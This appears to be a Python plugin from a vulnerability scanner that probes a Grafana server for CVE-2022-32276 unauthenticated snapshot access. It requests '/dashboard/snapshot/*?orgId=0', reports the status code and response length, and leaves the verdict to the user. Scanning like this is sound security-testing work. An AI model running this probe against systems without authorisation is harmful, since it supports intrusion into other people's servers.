#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()


class Cve_2022_32276:

    def run(self, urls):
        url = urls + '/dashboard/snapshot/*?orgId=0'
        try:
            response = requests.get(url, headers=self.header, verify=self.ssl, proxies=self.proxy)
            OutPrintInfo("Grafana",'是否存在漏洞需自行检测')
            OutPrintInfo("Grafana",f'URL: {url} 响应码:[b bright_red]{str(response.status_code)}[/b bright_red] 响应长度:[b bright_red]{str(len(response.text))}[/b bright_red]')
        except Exception:
            OutPrintInfo("Grafana","目标请求出错")

    def main(self, target):
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]

        self.header, self.proxy = ReqSet(header=header, proxy=proxy)

        OutPrintInfo("Grafana", '开始执行Grafana未经身份验证访问检测')
        self.run(url)

        OutPrintInfo("Grafana",'Grafana未经身份验证访问检测结束')